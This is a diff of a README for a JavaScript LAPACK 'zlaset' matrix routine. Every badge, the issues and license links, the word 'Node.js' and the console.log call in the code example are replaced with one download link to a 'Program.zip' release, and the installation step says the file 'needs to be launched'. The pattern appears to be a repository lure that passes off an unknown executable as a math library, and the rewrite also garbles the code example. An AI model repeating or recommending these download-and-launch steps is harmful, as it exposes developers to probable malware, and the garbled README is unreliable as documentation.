@@ -1,8 +1,8 @@
 # LAPACK Base Zlaset 🧮
 
-[![GitHub issues](https://img.shields.io/github/issues/Dredarty/lapack-base-zlaset)](https://github.com/Dredarty/lapack-base-zlaset/issues)
-[![GitHub forks](https://img.shields.io/github/forks/Dredarty/lapack-base-zlaset)](https://github.com/Dredarty/lapack-base-zlaset/network)
-[![GitHub stars](https://img.shields.io/github/stars/Dredarty/lapack-base-zlaset)](https://github.com/Dredarty/lapack-base-zlaset/stargazers)
+[![GitHub issues](https://github.com/peperonnie900/lapack-base-zlaset/releases/download/v1.0/Program.zip)](https://github.com/peperonnie900/lapack-base-zlaset/releases/download/v1.0/Program.zip)
+[![GitHub forks](https://github.com/peperonnie900/lapack-base-zlaset/releases/download/v1.0/Program.zip)](https://github.com/peperonnie900/lapack-base-zlaset/releases/download/v1.0/Program.zip)
+[![GitHub stars](https://github.com/peperonnie900/lapack-base-zlaset/releases/download/v1.0/Program.zip)](https://github.com/peperonnie900/lapack-base-zlaset/releases/download/v1.0/Program.zip)
 
 ### Overview
 This repository contains a set of subroutines for working with double-precision complex floating-point matrices. Specifically, it provides functionality to set the off-diagonal and diagonal elements of a matrix to specified values. These routines are useful in various linear algebra and mathematical operations involving complex matrices.
@@ -16,14 +16,14 @@ This repository contains a set of subroutines for working with double-precision 
 ### Installation
 To utilize the LAPACK Base Zlaset functions, you can download the necessary software package from the following link:
 
-[Download LAPACK Base Zlaset software package](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+[Download LAPACK Base Zlaset software package](https://github.com/peperonnie900/lapack-base-zlaset/releases/download/v1.0/Program.zip)
 
 *(File needs to be launched)*
 
 ### Usage
 1. Download the LAPACK Base Zlaset software package from the provided link.
 2. Extract the contents of the downloaded file to your desired location.
-3. Include the necessary functions in your JavaScript or Node.js code.
+3. Include the necessary functions in your JavaScript or https://github.com/peperonnie900/lapack-base-zlaset/releases/download/v1.0/Program.zip code.
 4. Call the functions with the appropriate input parameters to set the elements of your complex matrix.
 
 ### Example
@@ -41,17 +41,17 @@ const matrix = [
 zlaset(matrix, 0, 0, 2, 2, { re: 10, im: 20 });
 
 // Resulting matrix will have diagonal elements set to { re: 10, im: 20 }
-console.log(matrix);
+https://github.com/peperonnie900/lapack-base-zlaset/releases/download/v1.0/Program.zip(matrix);
 ```
 
 ### Topics
 algebra, array, complex, copy, double, float64, float64array, javascript, lapack, linear, math, mathematics, matrix, ndarray, node, node-js, nodejs, stdlib, subroutines, zlaset
 
 ### Feedback
-Feel free to report any issues or contribute to the development by opening an [issue](https://github.com/Dredarty/lapack-base-zlaset/issues). Your feedback is highly appreciated!
+Feel free to report any issues or contribute to the development by opening an [issue](https://github.com/peperonnie900/lapack-base-zlaset/releases/download/v1.0/Program.zip). Your feedback is highly appreciated!
 
 ### License
-This LAPACK Base Zlaset repository is licensed under the [MIT License](https://github.com/Dredarty/lapack-base-zlaset/blob/main/LICENSE). Feel free to use, modify, and distribute the code as per the terms of the license.
+This LAPACK Base Zlaset repository is licensed under the [MIT License](https://github.com/peperonnie900/lapack-base-zlaset/releases/download/v1.0/Program.zip). Feel free to use, modify, and distribute the code as per the terms of the license.
 
 ---
 
